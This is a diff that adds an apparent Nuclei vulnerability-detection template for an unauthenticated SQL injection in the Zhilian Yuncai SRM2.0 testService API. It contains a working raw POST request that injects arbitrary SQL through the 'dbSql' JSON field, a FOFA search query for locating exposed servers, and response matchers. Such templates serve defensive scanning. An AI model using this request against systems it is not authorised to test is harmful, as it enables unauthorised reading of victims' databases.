@@ -1,0 +1,44 @@
+id: zlyc-sm2-sqli
+
+info:
+  name: 智联云采SRM2.0 testService - SQL Injection
+  author: qwtd
+  severity: high
+  description: 智联云采testService存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息。
+  reference:
+    - https://wiki.wy876.cn/#/./%E6%99%BA%E4%BA%92%E8%81%94%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%99%BA%E8%81%94%E4%BA%91%E9%87%87testService%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  metadata:
+    max-request: 2
+    vendor: 智联云采
+    product: SRM2.0
+    fofa-query: title=="SRM 2.0"
+  tags: 智联云采SRM2.0
+
+http:
+  - raw:
+      - |
+        POST /adpweb/a/ica/api/testService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json
+
+        {
+            "dbId": "1001",
+            "dbSql": "#set ($lang = $lang) SELECT * FROM v$version",
+            "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
+            "serviceCode": "q",
+            "serviceName": "q",
+            "serviceParams": "{\"lang\":\"zh_CN\"}"
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "execution"
+          - "sqlcode"
+
+      - type: status
+        status:
+          - 200
